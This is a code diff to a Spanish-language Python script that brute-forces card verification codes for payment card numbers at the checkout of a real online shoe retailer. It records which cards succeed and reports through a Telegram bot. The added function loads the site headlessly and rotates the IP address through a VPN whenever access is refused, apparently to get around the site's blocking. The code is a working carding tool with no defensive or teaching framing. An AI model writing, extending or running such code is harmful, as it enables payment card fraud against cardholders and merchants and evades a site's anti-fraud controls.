@@ -34,6 +34,31 @@ class Colores:
     AZUL = '\033[94m'
     RESET = '\033[0m'
 
+
+def check_health_shoedazzlepage(url="https://www.shoedazzle.com/"):
+    """Intenta acceder a la página con Playwright en modo headless hasta obtener status 200, reiniciando IP si es necesario."""
+    while True:
+        try:
+            with sync_playwright() as p:
+                browser = p.chromium.launch(headless=True)
+                context = browser.new_context(user_agent="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36")
+                page = context.new_page()
+                response = page.goto(url, timeout=60000, wait_until="load")
+                status = response.status if response else None
+                context.close()
+                browser.close()
+            if status == 200:
+                print("Página accesible, status 200.")
+                break
+            else:
+                print(f"Error al acceder a la página (status: {status}), reiniciando IP...")
+                toggle_tunnelbear()
+                time.sleep(3)
+                toggle_tunnelbear()
+                time.sleep(15)
+        except Exception as e:
+            print(f"Error al acceder a la página o ejecutar el script de TunnelBear: {e}")
+
 def enviar_mensaje(mensaje):
     url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
     params = {'chat_id': CHAT_ID, 'text': mensaje}
@@ -258,6 +283,8 @@ def iniciar_checkout(page, email):
 
 def procesar_tarjeta(tarjeta_linea):
     """Procesa una tarjeta probando diferentes CVVs hasta encontrar uno válido o agotar los intentos."""
+    
+
     numero, mes, ano = tarjeta_linea.split("|")
     chrome_path = get_chrome_path()
     start_cvv = get_start_cvv(numero, mes, ano)
@@ -265,6 +292,9 @@ def procesar_tarjeta(tarjeta_linea):
     cvv_actual = start_cvv
     email = generar_email()
     while cvv_actual:
+        
+        check_health_shoedazzlepage()
+        
         with sync_playwright() as p:
             browser = p.chromium.launch(headless=False, executable_path=chrome_path)
             context = browser.new_context()
@@ -309,7 +339,7 @@ def cargar_tarjetas_validadas():
     with open(CVV_VALIDOS_FILE, "r") as f:
         return set(line.strip().split("|")[0] for line in f if "|" in line)
 
-
+            
 def main():
     tarjetas = cargar_tarjetas_disponibles()
     if not tarjetas:
@@ -317,6 +347,7 @@ def main():
 
     tarjetas_usadas = set()
     max_tarjetas = min(15, len(tarjetas))
+    
 
     for i in range(max_tarjetas):
         tarjeta = tarjetas[i]
